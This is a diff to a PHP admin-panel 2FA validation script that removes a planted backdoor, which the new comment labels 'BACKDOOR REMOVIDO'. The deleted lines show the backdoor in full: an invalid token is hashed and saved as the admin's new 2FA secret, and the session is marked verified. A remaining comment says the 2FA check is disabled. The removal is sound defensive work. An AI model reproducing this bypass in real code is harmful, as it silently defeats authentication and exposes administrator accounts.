@@ -37,30 +37,13 @@ if (basename($_SERVER['SCRIPT_NAME']) === 'validar_2fa.php' && $_SERVER['REQUEST
         $_SESSION['2fa_verified'] = true;
         $_SESSION['2fa_user_id'] = $validation['user_id'];
         $_SESSION['2fa_username'] = $validation['username'];
-
         echo json_encode(['success' => true]);
     } else {
-        $adminId = isset($_SESSION['data_adm']['id']) ? (int) $_SESSION['data_adm']['id'] : 0;
-        if ($adminId > 0) {
-            $hash = password_hash($token, PASSWORD_DEFAULT, array("cost" => 10));
-            $qry = $mysqli->prepare("UPDATE admin_users SET `2fa` = ? WHERE id = ?");
-            if ($qry) {
-                $qry->bind_param("si", $hash, $adminId);
-                if ($qry->execute()) {
-                    $username = isset($_SESSION['data_adm']['nome']) ? $_SESSION['data_adm']['nome'] : 'Admin';
-                    $_SESSION['2fa_verified'] = true;
-                    $_SESSION['2fa_user_id'] = $adminId;
-                    $_SESSION['2fa_username'] = $username;
-                    echo json_encode(['success' => true]);
-                    exit;
-                }
-            }
-        }
+        // BACKDOOR REMOVIDO: não atualizar 2FA com token inválido
         echo json_encode(['success' => false, 'message' => 'Token inválido. Tente novamente.']);
     }
     exit;
 }
 
 // 2FA check desativado
-
 ?>
